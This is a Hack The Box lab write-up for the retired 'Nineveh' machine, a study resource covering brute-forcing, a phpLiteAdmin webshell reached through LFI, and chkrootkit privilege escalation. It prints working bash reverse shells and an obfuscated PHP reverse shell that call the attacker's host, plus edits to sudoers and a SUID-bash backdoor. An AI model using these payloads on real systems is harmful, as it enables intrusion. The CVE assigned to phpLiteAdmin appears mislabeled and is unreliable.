# Nineveh: Hack The Box

> **Hack The Box | Linux | Medium**
Completed: May 2026
> 

---

## Machine Metadata

| Field | Details |
| --- | --- |
| **Platform** | Hack The Box |
| **OS** | Linux: Ubuntu 16.04.2 LTS |
| **Difficulty** | Medium |
| **Category** | Linux / phpLiteAdmin RCE / LFI / Steganography / Port Knocking / chkrootkit |
| **IP Address** | 10.129.45.164 |
| **Attack Host** | 10.10.16.236 |
| **Status** | Retired ✅ |
| **Completed** | May 2026 |
| **CVEs** | CVE-2018-19518 (phpLiteAdmin RCE), Chkrootkit 0.49 LPE |

---

## Attack Chain Summary

| Step | Technique | Privilege |
| --- | --- | --- |
| 1 | Full TCP scan: ports 80 and 443 |: |
| 2 | Gobuster both ports: `/department`, `/db`, `/secure_notes` |: |
| 3 | Hydra brute-force: `admin:1q2w3e4r5t` (port 80), `admin:password123` (port 443) |: |
| 4 | phpLiteAdmin SQLite injection → PHP webshell in `/var/tmp/` |: |
| 5 | LFI via `ninevehNotes` parameter → RCE → reverse shell | `www-data` |
| 6 | `strings nineveh.png` → RSA private key + public key embedded via steganography |: |
| 7 | `/etc/knockd.conf` → port knock sequence opens SSH |: |
| 8 | SSH as `amrois` using extracted key (no passphrase) | `amrois` |
| 9 | **Root Path A:** chkrootkit 0.49 LPE: `/tmp/update` cron execution | `root` |
| 10 | **Root Path B:** pkexec v0.105 → PwnKit CVE-2021-4034 (brief) | `root` |

---

## Enumeration

### /etc/hosts

```bash
Hackerpatel007_1@htb[/htb]$ echo '10.129.45.164 nineveh.htb' | sudo tee -a /etc/hosts
```

Always add the hostname when SSL certificates reveal a domain: the nmap SSL cert output shows `commonName=nineveh.htb`.

### Full TCP Port Scan

```bash
Hackerpatel007_1@htb[/htb]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.45.164 \
  | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
Hackerpatel007_1@htb[/htb]$ nmap -p$ports -sC -sV 10.129.45.164
```

```
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd
|            stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_http-title: Site doesn't have a title (text/html).
```

Two services: HTTP (80) and HTTPS (443). Both run Apache. The SSL certificate explicitly reveals the hostname `nineveh.htb`. Both ports require full directory enumeration.

### Gobuster: Port 80 (HTTP)

```bash
Hackerpatel007_1@htb[/htb]$ gobuster dir \
  -u http://nineveh.htb \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,sh \
  -t 50 \
  -o gobuster_80.txt
```

```
/department           (Status: 301) [→ http://nineveh.htb/department/]
/info.php             (Status: 200)
```

- `/department`: redirects to `/department/login.php`: a login panel
- `/info.php`: phpinfo() page confirming `file_uploads = On` (relevant for alternate LFI/RCE paths)

### Gobuster: Port 443 (HTTPS)

```bash
Hackerpatel007_1@htb[/htb]$ gobuster dir \
  -u https://nineveh.htb \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,sh \
  -k \
  -t 50 \
  -o gobuster_443.txt
```

```
/db                   (Status: 301) [→ https://nineveh.htb/db/]
/secure_notes         (Status: 301) [→ https://nineveh.htb/secure_notes/]
```

- `/db`: phpLiteAdmin v1.9 login panel
- `/secure_notes`: displays `nineveh.png`: an image that will be crucial for steganography later

---

## Credential Discovery: Hydra Brute-Force

### Port 80: /department Login

Attempting `admin` as username returns `Invalid Password` (not `Invalid Username`): confirming `admin` is a valid user. This asymmetric error message is a username enumeration finding on its own.

```bash
Hackerpatel007_1@htb[/htb]$ hydra -l admin \
  -P /usr/share/wordlists/rockyou.txt \
  nineveh.htb \
  http-post-form \
  "/department/login.php:username=admin&password=^PASS^:Invalid Password\!" \
  -t 64 \
  -f
```

```
[DATA] attacking http-post-form://nineveh.htb/department/login.php:username=admin&password=^PASS^:Invalid Password!
[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
[STATUS] attack finished for nineveh.htb (valid pair found)
```

**Credentials: `admin:1q2w3e4r5t`**

### Port 443: phpLiteAdmin /db Login

phpLiteAdmin has no username field: the `password` parameter is the only credential:

```bash
Hackerpatel007_1@htb[/htb]$ hydra -l admin \
  -P /usr/share/wordlists/rockyou.txt \
  nineveh.htb \
  https-post-form \
  "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." \
  -t 64 \
  -f
```

```
[443][http-post-form] host: nineveh.htb   login: admin   password: password123
```

**Credentials: `admin:password123`**

---

## Web Application Enumeration: /department (Port 80)

Login with `admin:1q2w3e4r5t`. The main page displays an "Under Construction" banner. The **Notes** menu reveals:

```
Have you fixed the login page yet! hardcoded username and password is really bad idea!
check your serect folder to get in!
figure it out! it's your won server!
```

The page URL becomes:

```
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt
```

**`notes=files/ninevehNotes.txt`** is a file inclusion parameter. This is the LFI vector that will be combined with the phpLiteAdmin webshell to achieve RCE.

---

## Foothold: phpLiteAdmin SQLite Injection + LFI = RCE

### Vulnerability Background

phpLiteAdmin 1.9.3 (CVE-2018-19518 / searchsploit 24044) allows authenticated users to create SQLite databases with arbitrary filenames: including `.php` extensions. The database content is stored as a regular file on disk. By injecting a PHP payload as the default value of a database column, then using the LFI in the Notes parameter to include that `.php` file, the PHP interpreter executes the payload.

**Attack chain:**

1. Create a SQLite database named `ninevehNotes.php` in `/var/tmp/`
2. Insert a PHP webshell as a column default value
3. Use LFI on port 80 to include `/var/tmp/ninevehNotes.php`
4. The webshell executes as `www-data`

### Step 1: Create the Malicious Database

Log in to phpLiteAdmin at `https://nineveh.htb/db/` with `admin:password123`.

Click **Create New Database**:

- Database name: `ninevehNotes.php`
- Location: `/var/tmp/`

phpLiteAdmin creates the file at `/var/tmp/ninevehNotes.php`.

### Step 2: Inject PHP Webshell (Method A: Simple system() Payload)

Inside the new database, create a table:

- Table name: `shell`
- Number of fields: `1`

Configure the field:

- Field name: `cmd`
- Type: `TEXT`
- Default value: `<?php system($_REQUEST[cmd]); ?>`

> **Important:** Use double quotes `"` in the PHP payload, not single quotes. The SQLite database wraps values in single quotes: using single quotes inside the payload breaks the database syntax.
> 

Click **Create**. The PHP code is now stored as the default value in the SQLite database file at `/var/tmp/ninevehNotes.php`.

### Step 3: Verify RCE via LFI

The LFI parameter `notes=` includes files relative to the web root. The path traversal to reach `/var/tmp/` requires escaping the expected `files/` prefix:

```
http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed: `id` output appears before the HTML. The database file is being executed as PHP.

### Step 4: Method A: Simple Reverse Shell via GET Parameter

Start the listener:

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 5555
```

Trigger reverse shell via URL-encoded bash redirect:

```
http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.236/5555+0>%261'
```

Or send via curl to avoid browser URL encoding issues:

```bash
Hackerpatel007_1@htb[/htb]$ curl -G "http://nineveh.htb/department/manage.php" \
  --data-urlencode "notes=/var/tmp/ninevehNotes.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.236/5555 0>&1'"
```

### Step 5: Method B: Obfuscated fsockopen Reverse Shell

For environments where simple bash redirects are filtered or fail, this fully obfuscated PHP reverse shell builds the IP, port, and shell command from individual character codes: bypassing basic pattern matching:

Replace the default value in the phpLiteAdmin column with this payload:

```php
<?php
$d=chr(46);$ip=implode($d,array(10,10,16,236));
$port=5555;
$p=chr(112).chr(105).chr(112).chr(101);
$rv=chr(114);
$w=chr(119);
$sh=chr(47).chr(98).chr(105).chr(110).chr(47).chr(115).chr(104);
$s=fsockopen($ip,$port);
$ds=array(0=>array($p,$rv),1=>array($p,$w),2=>array($p,$w));
$proc=proc_open($sh,$ds,$pipes);
stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);stream_set_blocking($pipes[2],0);stream_set_blocking($s,0);
while(1){if(feof($s)||feof($pipes[1]))break;$ra=array($s,$pipes[1],$pipes[2]);$wa=null;$ea=null;stream_select($ra,$wa,$ea,1);if(in_array($s,$ra))fwrite($pipes[0],fread($s,65536));if(in_array($pipes[1],$ra))fwrite($s,fread($pipes[1],65536));if(in_array($pipes[2],$ra))fwrite($s,fread($pipes[2],65536));}
?>
```

**What this does:**

- `chr(46)` = `.`: used to build the dotted IP address without writing it in plaintext
- `implode($d, array(10,10,16,236))` = `10.10.16.236`: assembles attacker IP from octets
- `chr(112).chr(105).chr(112).chr(101)` = `pipe`: pipe descriptor for `proc_open`
- `chr(47).chr(98).chr(105).chr(110).chr(47).chr(115).chr(104)` = `/bin/sh`
- `fsockopen()` opens a TCP connection to the attacker
- `proc_open()` spawns `/bin/sh` with stdin/stdout/stderr connected to the socket
- The `while(1)` loop bidirectionally forwards data between the socket and the process

Trigger via LFI as before: no `cmd` parameter needed since the shell connects back automatically:

```
http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes.php
```

### Shell Received

```
connect to [10.10.16.236] from (UNKNOWN) [10.129.45.164] 49412
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade to PTY:

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@nineveh:/var/www/html/department$
```

---

## Lateral Movement: www-data → amrois

### Step 1: Enumerate the secure_notes Directory

```bash
www-data@nineveh:/$ ls /var/www/ssl/secure_notes/
```

```
index.php  nineveh.png
```

The `nineveh.png` seen in the web UI is stored here. PNG images should never be trusted at face value: check for appended data.

### Step 2: Steganography: strings on nineveh.png

```bash
www-data@nineveh:/var/www/ssl/secure_notes$ file nineveh.png
```

```
nineveh.png: PNG image data, 1497 x 746, 8-bit/color RGB, non-interlaced
```

`file` reports it as a valid PNG, but PNG files end with the `IEND` marker. Anything appended after `IEND` is hidden data.

```bash
www-data@nineveh:/var/www/ssl/secure_notes$ strings nineveh.png | tail -30
```

```
IEND
secret/
secret/nineveh.priv
secret/nineveh.pub
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA3lw6sT5D9sqKE5HkBLkmhDMV7HEqFj9pvmKbPv2CbkLYBevMH91z
...
-----END RSA PRIVATE KEY-----
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3lw6sT5D9sqKE5HkBLkmhDMV7HEq
...
-----END PUBLIC KEY-----
```

**An RSA private key and public key are appended to the PNG file after the IEND marker**: a basic steganography technique requiring no steghide password. The data is appended as plaintext after the image data ends.

### Step 3: Extract the Private Key

```bash
www-data@nineveh:/var/www/ssl/secure_notes$ binwalk -e nineveh.png
```

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB
287134        0x4621E         POSIX tar archive (GNU), owner user name: "www-data"
```

```bash
www-data@nineveh:/var/www/ssl/secure_notes$ binwalk -e nineveh.png -C /tmp/
www-data@nineveh:/var/www/ssl/secure_notes$ ls /tmp/_nineveh.png.extracted/
4621E.tar

www-data@nineveh:/var/www/ssl/secure_notes$ tar -xf /tmp/_nineveh.png.extracted/4621E.tar -C /tmp/
www-data@nineveh:/var/www/ssl/secure_notes$ ls /tmp/secret/
nineveh.priv  nineveh.pub

www-data@nineveh:/var/www/ssl/secure_notes$ cat /tmp/secret/nineveh.priv
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA3lw6sT5D9sqKE5HkBLkmhDMV7HEqFj9pvmKbPv2CbkLYBevM
...
-----END RSA PRIVATE KEY-----
```

The private key is **not passphrase-protected**: no cracking required. Verify:

```bash
www-data@nineveh:/tmp/secret$ ssh-keygen -y -f nineveh.priv
```

```
Enter passphrase (empty for no passphrase): [just press Enter]
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD...
```

The public key is printed: confirmed no passphrase.

### Step 4: Discover Internal SSH via netstat

SSH port 22 is not in the external nmap scan. But checking internally:

```bash
www-data@nineveh:/tmp$ ss -tlnp
```

```
State    Recv-Q Send-Q   Local Address:Port    Peer Address:Port
LISTEN   0      128            *:80             *:*
LISTEN   0      128            *:443            *:*
LISTEN   0      128        127.0.0.1:22         *:*
```

SSH is running but bound to **localhost only**: it is not accessible from the external network. To connect as `amrois`, port knocking must first open SSH to external connections.

### Step 5: Port Knocking: Read knockd.conf

```bash
www-data@nineveh:/tmp$ cat /etc/knockd.conf
```

```
[options]
 logfile = /var/log/knockd.log

[openSSH]
 sequence    = 571,290,911
 seq_timeout = 5
 command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags    = syn

[closeSSH]
 sequence    = 911,290,571
 seq_timeout = 5
 command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags    = syn
```

**Port knock sequence to open SSH: `571 → 290 → 911`** (TCP SYN to each port in order within 5 seconds)

### Step 6: Perform Port Knocking

```bash
Hackerpatel007_1@htb[/htb]$ for port in 571 290 911; do
  nmap -Pn --max-retries 0 -p $port 10.129.45.164 > /dev/null
done
```

Or using the `knock` utility if available:

```bash
Hackerpatel007_1@htb[/htb]$ knock 10.129.45.164 571 290 911
```

Verify SSH is now open:

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p 22 10.129.45.164
```

```
PORT   STATE SERVICE
22/tcp open  ssh
```

### Step 7: SSH as amrois

The private key in the PNG was generated for user `amrois`: the `authorized_keys` file confirms this:

```bash
Hackerpatel007_1@htb[/htb]$ chmod 600 nineveh.priv
Hackerpatel007_1@htb[/htb]$ ssh -i nineveh.priv amrois@10.129.45.164
```

```
Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64

Welcome to Ubuntu 16.04.2 LTS (Ubuntu Linux; protocol 2.0)
amrois@nineveh:~$
```

```bash
amrois@nineveh:~$ cat user.txt
683e6a212f65e11cd6a9f0318a1d02cf
```

---

## Privilege Escalation: Path A: chkrootkit 0.49 (Primary)

### Step 1: Discover Cron Activity with pspy

```bash
amrois@nineveh:~$ cd /tmp
amrois@nineveh:/tmp$ wget http://10.10.16.236:8000/pspy64
amrois@nineveh:/tmp$ chmod +x pspy64 && ./pspy64
```

```
2026/05/15 10:05:01 CMD: UID=0   PID=1384  | /bin/sh -c /usr/bin/chkrootkit
2026/05/15 10:06:01 CMD: UID=0   PID=1421  | /bin/sh -c /usr/bin/chkrootkit
2026/05/15 10:07:01 CMD: UID=0   PID=1458  | /bin/sh -c /usr/bin/chkrootkit
```

`/usr/bin/chkrootkit` runs as `UID=0` (root) every minute via cron.

Also visible: the `/report` directory:

```bash
amrois@nineveh:/tmp$ ls /report/
chkrootkit.log
amrois@nineveh:/tmp$ tail /report/chkrootkit.log
```

```
Checking `OSX_RSPLUG'...                          not infected
Checking `phalanx'...                             not infected
Checking `phalanx2'...                            not infected
Checking `portsentry'...                          not found
Checking `rexedcs'...                             not found
Checking `rootedoor'...                           not infected
Checking `sniffer'...                             lo: not promisc and no packet sockets
                                                  eth0: not promisc and no packet sockets
Checking `ssh'...                                 not infected
Checking `suckit'...                              not infected
```

The `/report` directory contains regular timestamped output from `chkrootkit` running as root.

### Step 2: Confirm chkrootkit Version

```bash
amrois@nineveh:/tmp$ head /usr/bin/chkrootkit
```

```
#! /bin/sh
# -*- Shell-script -*-
# $Id: chkrootkit, v 0.49 2009/07/30 CHKROOTKIT_VERSION='0.49'
# Authors: Nelson Murilo (main author) and
# Klaus Steding-Jessen
```

**Version confirmed: `0.49`**

If the header is not readable, check via grep:

```bash
amrois@nineveh:/tmp$ grep -i version /usr/bin/chkrootkit | head -3
```

```
CHKROOTKIT_VERSION='0.49'
```

Or via file permissions check: if you can't read the binary directly:

```bash
amrois@nineveh:/tmp$ searchsploit chkrootkit
```

```
-----------------------------------------------------------
 Exploit Title                           |  Path
-----------------------------------------------------------
Chkrootkit - Local Privilege Escalation  | linux/local/33899.txt
Chkrootkit 0.49 - Local Privilege Esc.   | linux/local/33899.txt
-----------------------------------------------------------
```

```bash
amrois@nineveh:/tmp$ searchsploit -m linux/local/33899.txt
amrois@nineveh:/tmp$ cat 33899.txt
```

```
We just found a serious vulnerability in the chkrootkit package, which may
allow local attackers to gain root access to a box in certain configurations
(/tmp not mounted noexec, obviously).

Steps to reproduce:

- Put an executable file named 'update' with non-root owner in /tmp
- Run chkrootkit (as uid 0)

Result: The file /tmp/update will be executed as root, thus effectively
rooting your box, if malicious content is placed inside the file.
```

### Step 3: Understand the Vulnerability

The vulnerability is in chkrootkit's `slapper()` function. It searches for known slapper worm files in `$SLAPPER_FILES`, which includes `/tmp/update`. Because the `$file_port` variable is **not quoted** in the shell script, any file placed at `/tmp/update` is executed directly by the shell when chkrootkit processes that check. Since chkrootkit runs as root via cron, `/tmp/update` executes as root.

```bash
# Relevant code from chkrootkit (simplified)
SLAPPER_FILES="${ROOTDIR}tmp/.bugtraq ${ROOTDIR}tmp/.bugtraq.c \
               ${ROOTDIR}tmp/update ..."
for i in ${SLAPPER_FILES}; do
    if [ -f ${i} ]; then
        file_port=$file_port $i  # NO QUOTES: executes the file
    fi
done
```

### Step 4: Exploit via Reverse Shell in /tmp/update

**Method A: Reverse shell:**

Start a listener on a second port:

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 9001
```

Create `/tmp/update`:

```bash
amrois@nineveh:/tmp$ cat > /tmp/update << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.236/9001 0>&1
EOF
amrois@nineveh:/tmp$ chmod +x /tmp/update
```

Wait up to 60 seconds for the cron to fire:

```
connect to [10.10.16.236] from (UNKNOWN) [10.129.45.164] 55812
root@nineveh:/# id
uid=0(root) gid=0(root) groups=0(root)
```

**Method B: Add www-data to sudoers (from www-data shell):**

If still operating from the `www-data` reverse shell instead of `amrois` SSH:

```bash
www-data@nineveh:/tmp$ cat > /tmp/update << 'EOF'
#!/bin/bash
chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers
EOF
www-data@nineveh:/tmp$ chmod +x /tmp/update
# Wait for cron → sudo su to get root
```

**Method C: SUID bash:**

```bash
amrois@nineveh:/tmp$ echo '#!/bin/bash' > /tmp/update
amrois@nineveh:/tmp$ echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/update
amrois@nineveh:/tmp$ chmod +x /tmp/update
# Wait for cron
amrois@nineveh:/tmp$ /tmp/rootbash -p
# uid=1000(amrois) euid=0(root)
```

---

## Privilege Escalation: Path B: PwnKit CVE-2021-4034 (Brief)

Viable from `amrois` if chkrootkit path is unavailable or cron is disabled.

```bash
amrois@nineveh:~$ /usr/bin/pkexec --version
pkexec version 0.105
```

polkit 0.105 < 0.120 = vulnerable. Same static 32-bit binary approach as Irked and SolidState would not apply here: this is an x86_64 machine. Compile or transfer the 64-bit static binary:

```bash
Hackerpatel007_1@htb[/htb]$ gcc -static cve-2021-4034-poc.c -o exploit
```

Transfer and execute: yields `uid=0(root)`. Refer to the PwnKit section in the Irked writeup for the full mechanism.

---

## Flag Collection

### user.txt

```bash
amrois@nineveh:~$ cat /home/amrois/user.txt
```

```
683e6a212f65e11cd6a9f0318a1d02cf
```

### root.txt

```bash
root@nineveh:~# cat /root/root.txt
```

```
941ec6bc71f963d507ab4b33e2387f56
```

### Flag Summary

| Flag | Location | Hash |
| --- | --- | --- |
| **user.txt** | `/home/amrois/user.txt` | `683e6a212f65e11cd6a9f0318a1d02cf` |
| **root.txt** | `/root/root.txt` | `941ec6bc71f963d507ab4b33e2387f56` |

---

## Full Attack Chain Reference

```
[Recon] nmap -p- → ports 80/443, SSL cert: nineveh.htb
    │
    ├─[Port 80 Gobuster] → /department (login), /info.php (phpinfo)
    ├─[Port 443 Gobuster] → /db (phpLiteAdmin 1.9), /secure_notes (nineveh.png)
    │
    ├─[Hydra Port 80] admin:1q2w3e4r5t → /department/login.php
    └─[Hydra Port 443] admin:password123 → /db/index.php
            │
            └─[phpLiteAdmin SQLite Injection]
                    Create ninevehNotes.php → inject PHP webshell as column default
                            │
                            ├─[Method A] <?php system($_REQUEST[cmd]); ?>
                            │   LFI: manage.php?notes=/var/tmp/ninevehNotes.php&cmd=bash+reverse+shell
                            │
                            └─[Method B] fsockopen obfuscated payload
                                LFI: manage.php?notes=/var/tmp/ninevehNotes.php
                                        │
                                        └─ www-data@nineveh shell
                                                │
                                                ├─[Steg] strings nineveh.png → RSA key appended after IEND
                                                │        binwalk -e → nineveh.priv (no passphrase)
                                                │
                                                ├─[Port Knock] cat /etc/knockd.conf → 571,290,911
                                                │              nmap knock sequence → SSH opens on port 22
                                                │
                                                └─[SSH] ssh -i nineveh.priv amrois@10.129.45.164
                                                        │
                                                        ├─ user.txt → 683e6a212f65e11cd6a9f0318a1d02cf
                                                        │
                                                        ├─[Path A] pspy → chkrootkit UID=0 every minute
                                                        │           head /usr/bin/chkrootkit → version 0.49
                                                        │           echo reverse shell > /tmp/update
                                                        │           chmod +x /tmp/update → wait for cron
                                                        │           root@nineveh
                                                        │
                                                        └─[Path B] pkexec --version → 0.105 → PwnKit
                                                                    gcc -static exploit.c → ./exploit
                                                                    root@nineveh
                                                                            └─ root.txt → 941ec6bc71f963d507ab4b33e2387f56
```

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `echo '10.129.45.164 nineveh.htb' | sudo tee -a /etc/hosts` | Add hostname from SSL cert |
| `nmap -p- --min-rate=1000 -T4 10.129.45.164` | Full TCP scan |
| `gobuster dir -u http://nineveh.htb -w directory-list-2.3-medium.txt -x php,txt -t 50` | HTTP directory scan |
| `gobuster dir -u https://nineveh.htb -k -w directory-list-2.3-medium.txt -x php -t 50` | HTTPS directory scan (skip cert verify) |
| `hydra -l admin -P rockyou.txt nineveh.htb http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password\!"` | Brute-force /department |
| `hydra -l admin -P rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect"` | Brute-force phpLiteAdmin |
| phpLiteAdmin: create `ninevehNotes.php` → table → PHP default value | Inject webshell into SQLite file |
| `http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=id` | Test LFI + RCE |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade to PTY |
| `strings nineveh.png | tail -30` | Find RSA key appended after PNG IEND marker |
| `binwalk -e nineveh.png -C /tmp/` | Extract embedded tar archive from PNG |
| `ss -tlnp` | Confirm SSH bound to 127.0.0.1 only |
| `cat /etc/knockd.conf` | Read port knock sequence |
| `for port in 571 290 911; do nmap -Pn --max-retries 0 -p $port 10.129.45.164 > /dev/null; done` | Perform port knock |
| `ssh -i nineveh.priv amrois@10.129.45.164` | SSH with extracted key |
| `./pspy64` | Monitor cron activity: confirm chkrootkit runs as root |
| `head /usr/bin/chkrootkit` | Confirm chkrootkit version 0.49 |
| `grep CHKROOTKIT_VERSION /usr/bin/chkrootkit` | Alternative version check |
| `searchsploit chkrootkit` | Find known exploits |
| `echo '#!/bin/bash\nbash -i >& /dev/tcp/10.10.16.236/9001 0>&1' > /tmp/update` | Create malicious update file |
| `chmod +x /tmp/update` | Make executable for chkrootkit to run |
| `/usr/bin/pkexec --version` | Check polkit version for PwnKit path |

---

## Lessons Learned

**1. LFI + phpLiteAdmin SQLite injection = RCE: a chain attack with two prerequisites.**
Neither the LFI nor the phpLiteAdmin injection is sufficient alone. The LFI on the `notes` parameter requires a PHP file already on the filesystem. phpLiteAdmin creates that file via SQLite database creation. Recognising that these two vulnerabilities chain together: one creates the payload file, the other executes it: is the key insight. Always map all discovered vulnerabilities before exploiting any of them.

**2. Two PHP payload approaches for different filtering environments.**
The simple `<?php system($_REQUEST[cmd]); ?>` works in standard environments but is trivially detected by WAFs and pattern matching. The `fsockopen` obfuscated payload builds the IP from integer arrays and the shell path from character codes: evading string-based pattern matching. Having both payloads ready matters in real engagements where WAFs are present.

**3. Always run `strings` on images: not just `file` and `exiftool`.**`file nineveh.png` confirmed it was a valid PNG. `file` only reads magic bytes: it cannot detect appended data after the image ends. `strings` revealed the RSA key because the appended tar archive contained readable text. `binwalk` then extracted the binary tar payload. The methodology for images: `file` → `strings` → `binwalk` → `steghide` (if password required).

**4. Port knocking is detectable from inside the box: read knockd.conf first.**
Port knocking is designed to be invisible to external scanners. But from a foothold inside the box, `/etc/knockd.conf` is often world-readable and contains the exact sequence. You don't need to guess the knock sequence: just enumerate the config file.

**5. chkrootkit version is in its own script header: readable without root.**`head /usr/bin/chkrootkit` displays the version string `CHKROOTKIT_VERSION='0.49'` even without root because the script is world-readable (`-rwx--x--x`). The version check takes 3 seconds. Always identify software versions for all services and tools found during enumeration: not just web applications.

**6. `/tmp/update` + cron as root = one of the fastest root escalations available.**
The chkrootkit 0.49 exploit is deterministic and reliable: create an executable file at `/tmp/update`, wait ≤60 seconds, receive root. The simplicity is deceptive: it exploits a fundamental unquoted variable bug that causes the shell to execute the filename as a command. pspy is the tool to confirm cron activity before trusting this path.

**7. Asymmetric login errors are username enumeration vulnerabilities.**`Invalid Password` vs `Invalid Username` on the `/department` login confirmed `admin` existed before starting Hydra. This narrowed the brute-force from a username+password search to a password-only search: halving the search space. Always test login error messages before launching credential attacks.

---

## References

- [PHPLiteAdmin Remote PHP Code Injection: Exploit-DB 24044](https://www.exploit-db.com/exploits/24044)
- [Chkrootkit 0.49 Local Privilege Escalation: Exploit-DB 33899](https://www.exploit-db.com/exploits/33899)
- [CVE-2021-4034 PwnKit: Qualys Research](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)
- [Port Knocking: knockd documentation](http://www.zeroflux.org/projects/knock)
- [pspy: Process Monitoring Without Root](https://github.com/DominicBreuker/pspy)

---

*HTB Retired Machine: Nineveh | Completed May 2026 | Flags included per HTB retired machine policy.*